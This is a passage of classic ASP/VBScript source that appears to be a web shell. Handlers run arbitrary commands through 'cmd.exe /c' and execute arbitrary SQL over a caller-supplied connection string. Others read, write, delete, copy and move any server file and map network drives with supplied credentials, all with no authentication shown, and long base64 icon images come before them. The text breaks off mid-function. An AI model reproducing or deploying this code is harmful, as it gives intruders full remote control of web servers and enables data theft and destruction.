"NxqmhIw7sHFCj9UtYeSRRhJ525GHPLGEkpnhYIwbCCjAoAMprADUf1Q6UWN9BQyQDHOSMdHlEzxKJqYftix5ZgkJtOfAJQHMpGYJXhjS3jaXyHGbIU340MQA7dEJhAnv6KXiGwEgQKZhhgaQzaOB4VmLjUfxmcgT2WDaSwNM0GmnYXNewukeaQbFqBR+/rnpjHG6Fal3YcJxainueKrJrHLyOSigThh5AKXPaOpHqwSqyIMXRx6g6+ki" &_
"pZ4yoQAr5olkqr2smcyzYYE6SxNHAmmOixJpOwWxtOboRTvY7DAJRBlhyQ23MI7QhQlGGgKQhFBWtcUSQLqbUA7FkduvJgYgaYg21MhE78Fz/Kvvg6GEdABRY9EDcR1J5LvDPgh65JNgLqnU3cZ03ECiQwCy8dFdNt2EcsoAUTzMcMAUx1FRuTw8Mw2EUByJQvpZTMDO1P1sxh154KffcEUTEvPJSs+BhgLxeTJcTJNMjW7V0OQs3jnm" &_
"IC0z2LeAR5wDpelMlMZoA2IAK2VvBhlHScctCD4HtVLy2Xov4ttvUcEdOJQRAAAh+QQABQD/ACwAAAAAoABQAAAE/xDISau9OOvNu/8GcRyEmJzPMCRC871wLM/024ijog4P4iO7RKFGLBqPMYOAkHgoRrvBb4oIBBgOF3LL7cYajtKBQX4kdtWpdW0dLLzwuFwSLiXI5Gg14GP7B1pzgoMwC0oETyUPeAw+Kmt9fmwOhJWWGA0CmgIH" &_
"Cp4Ei3iOA5CSfgyXqambmp6ud6JAUlZ7pmuquIMLrAKuroxSKmm1tgG5x10FBiEEDpudvrBkslKRxajI2UXLyyUlmoi+THhnKj3WppTa6zLc3d4EmtCfJg8kJijEbIDs/R/K7uA1E+BgnrcsGBaQ+vPGn8MN7pYtgbcJRzMDHAQ8aIPwoccKDf8KFNAUUSCvjyiLFFjAklVAb6wCpZz5YiVLQy65TdTUkKZPDw1uslSyKaKBIT+TerAp" &_
"lChJdylDriwgU2kGpk2LckuJlSVSq1eFNlWy7KvHrjfNgq2AVqhaj0HFCq26VkJcuSzpPmybtu4Fvm/P4hXq96/cwIIlClhGuLAFqQuoJlXGi2dkx5gnOK28QG9mq5Qrk/yMWadojKQLR8yJOnVdo0Zd+9VJcavstcoEejt6u24d3QR6r90FPF5P4T+J/h64GLlS0Sd9aqyCxbPfitBIbKKpUJKb1AYK+vJ0wEFrlAu9Wwe7YN74A8c9" &_
"CigWQF1mA+PHn/e48RrpJfl9Yt//R/RZQZo3OZDnzUwFGvNZcfDM1J8tQLCwnnRiNMFAAvcMKB991Aih2jiMbEjAfh6l5wc1KiRwYVTSlOgidyrSEsUOAsx2QCiM2IPiRxrRwmIUCfiFgwIaOjFCcErd6OQAfo0g5ZRSWvWkHicc0IJSVJbT4gFW6fDkDydkiZhHRz7JwJnyjelImVm+yI4BUKh5gJzsNOAlGj7AWWaOPzFx5QmA/lTA" &_
"nj+Y4SeHSTWQgpNlgqlUJmJWuGiZSt3B5w8rFHbpCQyoQMKPD5V5DhUIsDnTAZdGISUBeB7DagKokhmrQwYsSuSUTKKUayO1qlAoWLOC6iqVpPZzQK2jFFlX9QHFRvGElEgmcNFHBdQKCQK3PkRnORxOyeNB3VYiDDprfOcYlSPwyAA8HrIj5iym8FMYDtQyYi08yR4jgDD0xWsVnVPGeA++i8WHjJ702oLNveKS440vMbFzaIOY3SBl" &_
"KPuG48omDphXVjYNYHwfPge7p+VE8bjjVblHTGjKw58xg6A4LJewWV+rBCzbcr5ouVw8LvF8SY3pwjwTGBOT54xAKxc1VyrdMSTcIUtWZBIvbuESZAADdOTcLqwI5AzXjTnXDy9bF5222utkAvJulRnQNdz+4ETQYoptIpbSeBPiDitiqRp4NgBxU/jhjYoUGeCM3xYBACH5BAAFAP8ALAAAAACgAFAAAAT/EMhJq7046827/5MhEITj" &_
"EMdBGGDrvnAsb4vopCSRMI9yJINB4iBozI7IpJLTEDgFB4VUx6g+gtjE0Ljser+dgmFschKk0l2VgUBgBwztgQuu27vj8YgERSuCVQNtWG2Fc3eIiTB5Yzkkfn9wbINtAQGFCAkFipydGWKMjjp+gJNuCJaXhUJ0nq6JDWJOeaKQpZipqoMDAq++dwULC0+zolFoQFW4qai5A62/0UjBwsRPxn4PgW65zbkBAwvS4zMNwsIixAaiN2hU" &_
"VwPM387Q5PZh5zXWAuskDmYqSpw4IOjSvG8O7in0QO1cuid6/jkRd4FApYOpGCzcqKGhQ3Vj/zo0AIIxF8eTFjw6TGdgE8MEJVOhnCnBXL6b9ZjEK6mR5kyV51y6EBAzoc+fNxcIfbFz3rOjNGMFK5ATxIKmqcJB3apEwANLAxxU5Uq2rNmzaNOqXcu2rdu3cOPKXegVFQOxc9VedUoxLwapSsf6wkrP7wWgS6URLWnU8ASgwhL/+srT" &_
"8QSbSYUJ5hTTkmUJkIOS6xzgM4DQ58hRxuhGSBG/qIWRW8z6jaa81PTwMxDZHmFmb4Ik2IzW3ENiC4gr2vutdXBeeY+ro0t513Mhc2Xt4yfZ9/U3cxmBDMnxe5A2Q167ZcQ+z8lIwTFp2bJej6PdLDgKeI5JyPxDbDUiCv8J5G00UnyFzDdfL2wVMKAj3dlTABDnFfKAgnK0tcCDOfTFURN/DIKhgm2JwCE/UI04YltPnJCDRAz69IOK" &_
"OzyAQ35nbWcNVAbQKFwKOCjH0UMoSKECilDNqCAWQAJJwFnDtAPJATj61ICSOwThQ5MpVMlVH5BI0RiPM8bBZZNPmmVAmFOscNaZQCqQwAMleOnTCMcY+eKbZyqgTRUvCkmOMXOamWZZKHD5ZxyOjEmTI2qsEYegChnApQKSBpSDnSftEamkCRxKVqIpRBoqOzyiIKmkPnBqJal/njrgVg58uoaNKqC1zgEXaupICrN4+KGtwQ2n1h4D" &_
"GmkNpa5EUajndUEAeFY/tUyxz0ykfkcfWi7mcAwR+whbaanXxZFAjGY10O0ZPsDohItjRCgNCvzJx+xGJqJAwD6OMGIgAW9Ugkkm8pK1nSjscQRPQQO7Yexa0q27gm4t3WvHjIIsk4oCFi80DDGi8KNOb/b0mMDAB2l1LMj9hksyOT9o7FTH9zRxzabSCZAPzV1cWUhnjkKZ72778CbaPQ9cVJlboOg2cj4K7ffbPHCJZ01SCh1IWlx5" &_
"XH1Twa9M6M1BPcEFym6Z8QzGlUXBlplSKE0Njto+ITYTc86IKxdgVB3lFVh4mSb44IQXbkEEACH5BAAFAP8ALAAAAACgAFAAAAT/EMhJq7046827/0BhjKRgLmCqrmzrbk1RLORI3CZxKIRjvMCgcOiRzUwmw225UzhvjgZxSq2qjCKkwLEkJBLOcOLxIPys6DQ6ZjRodbfDNzwYMO6KA0Gq7vtdWAVaAgd6XnMKdXZ3D4UEf5CRRViD" &_
"jodgCYp3inV7kp+gE4FuSHCXiZoIqpwHfKGvfqNaDoZfYJyqq4oJrbC+aWwyC4NMYKh1uQicXwK/zlWBw0hKN3R2yZwDXwfP3UTRNSS0Tne5isnKrt7rLcEF6hQGDgkMugMIAQHJCQXs/moNCODKh04bvH8Ihwi8p69gnWYJIxKRg85cnQQSMwZpcKBivoYD/zRicPAAH4MoIjHcU/WxJYJ+KSUUGNAy3wCYMSegwlfT5kGJNHsGGPBT" &_
"owCGQvM5iOkgqdKcFBLwTMog5gOnAapClYk1X8yuAbZOAPu160UBRRNedapV5Nqkynbh1NjU6dKUdeFmS5D2X9CeRHP+rRk3G0SRMwHPRTyYYLZdUEnaRClWMsjHisRqzoA52+bPFY49VsULLejNR0evstXrtNhMuHLZ2tbXdcICsJGpejCbmW2xAhKt7r3t92bixI1rRm6LwQBHZ5SLlINcUSFHtaV3M1D94nVH2jVSb279e6Hoxt1l" &_
"B8VxtqI85vVID2TknwHq2uJ/V04fS0T95qXXn/8R672iA4BP9ICeZgP6h9B98SnwAAOGQFHgbQ3KENGB302YQBdQfGYEDaQIYICGCQX0nQIMfAjiDQvmJMwgSCxm34F5vLjEXWI1IA2NJsakI4iflUjjiSkNieMJYhmpBQkpCaBjGAdocaE3JUxTQ0rUdBEGD4NAVYOUS5gYY0RcMEEljSjERMKQZ6aYJgFUOgCkjF2+eBiXUuYIpAlQ" &_
"kamjAG0G+ucWZoxgI0KCgohEk38uEY5RiMZB5SNb/fgGDuHEuc4sTXxJWU40ztkpkhGVGOqXPWzVADEwdmqiDFdKIg2dXzphiKcS0ZCDmWPWWN8/Jqwaxo6gnTpIIP+8miuzPXfwgulmymoRSK2RhFrHHdzyJWI4g5zILLE3QMstI9NqBq619D2ow7mb7GKaulme0F9C88BrUX7YriMCKeLei1ADE3K7LzYMndTvL+7QtzAkO5Cx0jkN" &_
"CXUTVBlKxGE2PE0F2MOwDJgRhAcMVLFdrmIBsiQHmuyxUG2F542KnBD0slAy23dMMmTl/A91PGMVs88zy7ESSygTbV9HQX+s9G253Xzx0xEFV/NQo1Kt9dYcRAAAIfkEAAUA/wAsAAAAAKAAUAAABP8QyEmrvTjrzbv/VFMUi2GaBaiubOu+4EgaQn0acK7v/CuXtSCNQBAYFr2kcpkTjWjBGpHoCDaY2KzWIitAg4TDtBjcms/JblTg" &_
"OIiJboXiIEDb7yx1NCw+JBJygQ5XeIWGF11fAm5if4CBCgQOh5SUTl5RbmGOkJEEOJUgAg8IAQyDoSs/X2EEnHIJDAMMCQepHQUDAbu8Aym3H6s1DkR/gQPIswwMBITAF7q80gPOzxtOJSbFx8nLy2LWFgLS5AGT4SsNi7Dd3g9uoOgAD+XSDPIsAnLt3nPg+PXIDUggoBq+DcQeeJOFAAGyWgcDTnv46+A1BwqXNXSYjBo+ehL/A3RM" &_
"YNAihgMKN3ZEdqDkrXESOSarY3KDAT8ruxHEF62czGQJanIgkBMoRHm5fBZF8IeOy5oNig50ZHEUr5/INjqq9dRkrGQbGw4UqmCp1q0thVbwk4BUWLEVDwow63DrH5pqJRj48zYsSZMNEqz0a/doXgkHGPQVOwDvwQKCwTZ8UPjP4QlRFwMVqq7sgLqVLV+WkDXsytFsKzN4Jyae0I4NryIbvbfyQ0ZiuobzXI/paACpHSXDrUntXIke" &_
"LzcILmuAP+KuD0YNeY42W1rEcRNQyyDkvd8UsmdXG3IX+PDiDyhoKyk6uvIBzk/gg1tBxgRTUH30Ll9v9owMvEGF/1zU9ScBfep5g98YnxzUk0C65dUAffcxOCA+SQkUl4EGhEGZgBaaZJVI+hlogYUhmmigACjCQYcRSKj4W4coykGGFTKORgyDcry4Ro7K7QjHHFWsIUCMQOY1RCtGCpEkeE3++ORoUbJBBApTKtnkGDdkKdQCRo5h" &_
"RJdeihiFkJ/cYMCGZYajDhhTqHmCiZcUEGE4QBAxppzujdZFF7TxeYIAMtyJ1J+AHiYoFGsmKiGiXRj6jBdyCoHoYZD+eRmfQSyAqKS3dJGNDUcEOmgNnkKalzBG/kbpCamqqtYIQDTZ56qZyvCoIlFgCV6uuq7KqxAmnFfnp5etQcwbRsgHbNKgUmgyBqiHXmpqi0X0Vye11mDSYhVItmkRjWOoB8gB1YlrUbmvyFGiuvJY6YoxsKz2" &_
"QIMXjFLKKdzCmwMUBHTSzgO3qZdVOb74iwaY63CDjGIyqYRcvwq3UAMkkc2i0mcBbFRgxVt05jBDYpXSsckSfQfyFgHvo4xpJsdW3spmkAugaVehLBHNZuwYi0aM5Vyeyjxj0cCy3jDG8cnlpVs0FgY4EMsDBIN1ssz1JPd0yHwMhjPCbG6dRYcHPNzWxp+ZPMC7YttxU1MGD1RQ23RPGQEAOwA="

img_dir = "R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="
img_lvUp= ""&_
"R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO"&_
"NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi"&_
"Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk"&_
"AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG"&_
"MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5"&_
"NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf"&_
"1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ"&_
"ADs="

img_txt = ""&_
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ"&_
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7"&_
"UpPWG3Ig6Hq/XmRjuZwkAAA7"

img_img = ""&_
"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci"&_
"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd"&_
"FxEAOw=="

img_unknow = ""&_
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U"&_
"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo"&_
"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31"&_
"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4"&_
"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP"&_
"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz"&_
"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ"&_
"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io"&_
"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&_
"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz"&_
"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM"&_
"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC"&_
"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj"&_
"yAsokBkQADs="

'*************************  media.asp  *************************


sub ErrHandle(rspText)
Dim myError
    if Err.Number<>0 then
		set js = new JSON

		set myError = server.createObject("scripting.dictionary")
			with myError
				.add "error", err.number
				.add "errorDesc", err.Description
			end with

		Response.Write rspText &" = {"
		Response.Write js.toJSON("error", myError, true)
		Response.Write ","
		Response.Write ajaxInfo()
		Response.Write "};"
		Response.End
    end if
end sub

sub ajaxExplorer()
	on error resume next
	Dim infoList, dirList, fList
	infoList = ajaxInfo()
	dirList = filesfoldersList()

	Response.Write "lstResponse = {"
	Response.Write infoList
	Response.Write ","
	Response.Write dirList
	Response.Write "};"
end sub

function ajaxInfo()
	on error resume next
	Dim myInfo
	set js = new JSON

	set myInfo = server.createObject("scripting.dictionary")
		with myInfo
			.add "path", folderLocation
			.add "filepath", FilePath
		end with

	ajaxInfo = js.toJSON("info", myInfo, true)
end function

function ajaxMapDriver()
	on error resume next
	Dim objNetwork, myInfo, driverLetter, remoteShare, userName, password

	driverLetter = Request("driverLetter")
	remoteShare = Request("remoteShare")
	userName = Request("userName")
	password = Request("password")


	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

	Set objNetwork = CreateObject("WScript.Network")
	objNetwork.MapNetworkDrive driverLetter & ":", remoteShare, True, userName, password
	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", ""
	end if
	Err.Clear

	with myInfo
		.add "action", "mapDriver"
		.add "driverLetter", driverLetter
		.add "remoteShare", remoteShare
		.add "msgResponse", "Mapped " & driverLetter & ": to " & remoteShare & " !"
	end with

	ajaxMapDriver = js.toJSON("action", myInfo, true)
end function

function ajaxRemoveDriver()
	on error resume next
	Dim objNetwork, myInfo, driverLetter

	driverLetter = Request("driverLetter")

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

	Set objNetwork = CreateObject("WScript.Network")
	objNetwork.RemoveNetworkDrive driverLetter & ":"
	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", ""
	end if
	Err.Clear

	with myInfo
		.add "action", "removeDriver"
		.add "driverLetter", driverLetter
		.add "msgResponse", "Driver " & driverLetter & ": removed !"
	end with

	ajaxRemoveDriver = js.toJSON("action", myInfo, true)
end function

function ajaxRenameFile()
	on error resume next
	Dim fileObject, myInfo, fileName, fileId, newName

	fileName = Request("fileName")
	fileId = Request("fileId")
	newName = Request("newName")

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

	Set fileObject = fso.GetFile(folderLocation & fileName)
	fileObject.Name = newName
	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", "Unable to rename """ & fileName & """ !" & vbCrLF & Err.Description
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", ""
	end if
	Err.Clear

		with myInfo
			.add "fileId", fileId
			.add "newName", newName
			.add "action", "renameFile"
			.add "fileName", fileName
			.add "msgResponse", "Renamed """ & fileName & """ to """ & """" & newName & """ !"
		end with

	ajaxRenameFile = js.toJSON("action", myInfo, true)
end function

function ajaxRenameFolder()
	on error resume next
	Dim fileObject, myInfo, folderName, folderId, newName

	folderName = Request("folderName")
	folderId = Request("folderId")
	newName = Request("newName")

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

	Set fileObject = fso.GetFolder(folderLocation & folderName)
	fileObject.Name = newName
	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", "Unable to rename """ & folderName & """ !"	& vbCrLF & Err.Description
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", ""
	end if
	Err.Clear

		with myInfo
			.add "folderId", folderId
			.add "newName", newName
			.add "action", "renameFolder"
			.add "folderName", folderName
			.add "msgResponse", "Renamed """ & folderName & """ to """ & """" & newName & """ !"
		end with

	ajaxRenameFolder = js.toJSON("action", myInfo, true)
end function


function ajaxCopy()
	on error resume next
	Dim myInfo, targetPath, foldersId, filesId, ndir, nfile, dir, file, itemName, itemPath, gMsg

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

	targetPath=addslash(Request("targetPath"))

	foldersId = Request("foldersId")
	filesId = Request("filesId")

	ndir=Request("dx").Count
	nfile=Request("fx").Count

	if (ndir>0) then
		gMsg="Copying folder(s) to """ & targetPath & """ ..."
			For Each dir In Request("dx")
				itemName=dir
				itemPath=folderLocation & itemName
				FSO.CopyFolder itemPath, targetPath, true
				gMsg=gMsg & vbCrLF & "- " & itemName & ": "
					if Err.Number<>0 then
						gMsg=gMsg & "error ("  & Err.Description  & ")"
						Err.Clear
					else
						gMsg=gMsg & "success"
					end if
			Next
	end if

	if (nfile>0) then
		if (ndir>0) then gMsg= gMsg & vbCrLF & vbCrLF
		gMsg=gMsg & "Copying file(s) to """ & targetPath & """ ..."
		For Each file In Request("fx")
				itemName=file
				itemPath=folderLocation & itemName
				FSO.CopyFile itemPath, targetPath, true
				gMsg=gMsg & vbCrLF & "- " & itemName & ": "
					if Err.Number<>0 then
						gMsg=gMsg & "error ("  & Err.Description  & ")"
						Err.Clear
					else
						gMsg=gMsg & "success"
					end if
		Next
	end if

	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description	& vbCrLF & gMsg
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", gMsg
	end if
	Err.Clear

		with myInfo
			.add "action", "copy"
			.add "foldersId", foldersId
			.add "filesId", filesId
			.add "msgResponse", gMsg
		end with

	ajaxCopy = js.toJSON("action", myInfo, true)
end function

function ajaxMove()
	on error resume next
	Dim myInfo, targetPath, foldersId, filesId, ndir, nfile, dir, file, itemName, itemPath, gMsg

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

	targetPath=addslash(Request("targetPath"))

	foldersId = ""
	filesId = ""

	ndir=Request("dx").Count
	nfile=Request("fx").Count

	if (ndir>0) then
		gMsg="Moving folder(s) to """ & targetPath & """ ..."
			For Each dir In Request("dx")
				itemName=dir
				itemPath=folderLocation & itemName
				FSO.MoveFolder itemPath, targetPath
				gMsg=gMsg & vbCrLF & "- " & itemName & ": "
					if Err.Number<>0 then
						gMsg=gMsg & "error ("  & Err.Description  & ")"
						Err.Clear
					else
						gMsg=gMsg & "success"
						foldersId = foldersId & itemName & "|"
					end if
			Next
	end if

	if (nfile>0) then
		if (ndir>0) then gMsg= gMsg & vbCrLF & vbCrLF
		gMsg=gMsg & "Moving file(s) to """ & targetPath & """ ..."
		For Each file In Request("fx")
				itemName=file
				itemPath=folderLocation & itemName
				FSO.MoveFile itemPath,targetPath
				gMsg=gMsg & vbCrLF & "- " & itemName & ": "
					if Err.Number<>0 then
						gMsg=gMsg & "error ("  & Err.Description  & ")"
						Err.Clear
					else
						gMsg=gMsg & "success"
						filesId = filesId & itemName & "|"
					end if
		Next
	end if

	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description	& vbCrLF & gMsg
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", gMsg
	end if

		with myInfo
			.add "action", "move"
			.add "foldersId", foldersId
			.add "filesId", filesId
			.add "msgResponse", gMsg
		end with

	ajaxMove = js.toJSON("action", myInfo, true)
end function


function ajaxDelete()
	on error resume next
	Dim myInfo, foldersId, filesId, ndir, nfile, dir, file, itemName, itemPath, gMsg

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

	foldersId = ""
	filesId = ""

	ndir=Request("dx").Count
	nfile=Request("fx").Count

	if (ndir>0) then
		gMsg="Deleting folder(s) ..."
			For Each dir In Request("dx")
				itemName=dir
				itemPath=folderLocation & itemName
				FSO.DeleteFolder itemPath,true
				gMsg=gMsg & vbCrLF & "- " & itemName & ": "
					if Err.Number<>0 then
						gMsg=gMsg & "error ("  & Err.Description  & ")"
						Err.Clear
					else
						gMsg=gMsg & "success"
						foldersId = foldersId & itemName & "|"
					end if
			Next
	end if

	if (nfile>0) then
		if (ndir>0) then gMsg= gMsg & vbCrLF & vbCrLF
		gMsg=gMsg & "Deleting file(s) ..."
		For Each file In Request("fx")
				Err.Clear
				itemName=file
				itemPath=folderLocation & itemName
				FSO.DeleteFile itemPath,true
				gMsg=gMsg & vbCrLF & "- " & itemName & ": "
					if Err.Number<>0 then
						gMsg=gMsg & "error ("  & Err.Description  & ")"
						Err.Clear
					else
						gMsg=gMsg & "success"
						filesId = filesId & itemName & "|"
					end if
		Next
	end if

	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description	& vbCrLF & gMsg
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", gMsg
	end if

		with myInfo
			.add "action", "delete"
			.add "foldersId", foldersId
			.add "filesId", filesId
			.add "msgResponse", gMsg
		end with

	ajaxDelete = js.toJSON("action", myInfo, true)
end function

function ajaxRunSQL()
	on error resume next
	Dim myInfo, connection, command, rHeader
	dim adoCon, rS
	dim i,intAffected

	connection=request.form("connection")
	command=request.form("command")
	intAffected = -1

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")
	set adoCon=Server.CreateObject("ADODB.Connection")
	adoCon.Open connection

	if Err.Number<>0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description
	else
		set rS=adoCon.Execute(command, intAffected)

		if Err.Number<>0 then
			myInfo.add "error", Err.Number
			myInfo.add "errorDesc", Err.Description
		else
			myInfo.add "error", 0
			myInfo.add "errorDesc", ""
			'myInfo.add "msgResponse", "SQL Command Execute Successful !"
		end if

		if (rS.Fields.Count>0) then
			redim rHeader(rS.Fields.Count-1)
			for i=0 to rS.Fields.Count-1
				if (rS.Fields(i).Name="") then
					rHeader(i) = "(No column name)"
				else
					rHeader(i) = Server.HtmlEncode(rS.Fields(i).Name)
				end if
			next
		else
			rS = ""
			rHeader = ""
		end if
	end if


	with myInfo
		.add "action", "runSQL"
		.add "affected", intAffected
		.add "header", rHeader
		.add "data", rS
	end with

	set rS=nothing
	set adoCon=nothing

	ajaxRunSQL = js.toJSON("action", myInfo, true)
end function

function ajaxRunCMD()
	on error resume next
	Dim myInfo, command, returnContent

	command=request.form("command")
	returnContent = ""

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")
	returnContent = server.createobject("wscript.shell").exec("cmd.exe /c "&command).stdout.readall
	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", ""
	end if

	with myInfo
		.add "action", "runCMD"
		.add "returnContent", returnContent
	end with

	ajaxRunCMD = js.toJSON("action", myInfo, true)
end function

function ajaxLoadFile()
	on error resume next
	Dim myInfo, itemPath, itemContent, f, f1

	itemPath=request.form("itemPath")
	itemContent = ""

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")
	set f = FSO.getFile(itemPath)

	if (f.size > 0 and f.size < 512000) then
		set f1 = FSO.OpenTextFile(itemPath, 1)
		itemContent = f1.readAll
	end if

	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", ""
	end if

	with myInfo
		.add "action", "loadFile"
		.add "itemPath", itemPath
		.add "itemSize", f.size
		.add "itemSizeText", FormatSize(f.size)
		.add "itemContent", itemContent
	end with

	ajaxLoadFile = js.toJSON("action", myInfo, true)
end function


function ajaxSaveFile()
	on error resume next
	Dim myInfo, itemPath, itemContent, saveMode, f1, gMsg

	itemPath=request.form("itemPath")
	itemContent = request.form("itemContent")
	saveMode = request.form("saveMode")
	gMsg = ""

	if(saveMode <> 8) then
		saveMode = 2
	end if

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")
	set f1 = FSO.OpenTextFile(itemPath,saveMode,true,false)

	f1.Write(itemContent)
	f1.close

	if Err.Number<>0 then
		gMsg="Unable to write to the file """ & itemPath & """, an error occured..."
	else
		gMsg="File saved !"
	end if

	if Err.Number <> 0 then
		myInfo.add "error", Err.Number
		myInfo.add "errorDesc", Err.Description	& vbCrLF & gMsg
	else
		myInfo.add "error", 0
		myInfo.add "errorDesc", ""
	end if

	with myInfo
		.add "action", "saveFile"
		.add "saveMode", saveMode
		.add "itemPath", itemPath
	end with

	ajaxSaveFile = js.toJSON("action", myInfo, true)
end function

function ajaxNewFile()
	on error resume next
	Dim myInfo, itemName, itemPath, gMsg, newItem, f1

	itemName=request.form("itemName")
	itemPath=folderLocation & itemName

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")

